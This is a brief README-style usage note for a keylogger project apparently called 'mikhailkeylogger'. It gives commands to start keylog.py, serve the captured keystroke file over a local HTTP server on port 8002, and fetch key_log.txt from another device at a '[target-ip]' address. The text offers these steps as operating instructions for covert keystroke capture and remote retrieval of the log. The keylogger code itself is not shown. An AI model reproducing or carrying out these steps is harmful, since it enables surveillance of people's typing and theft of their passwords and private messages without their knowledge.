# To use, run these commands:

cd mikhailkeylogger

python3 keylog.py


# Then, in a new terminal window, run this command:

python3 -m http.server 8002

# On another device, open web browser, type in: 
http://[target-ip]:8002/KeyLogger/key_log.txt
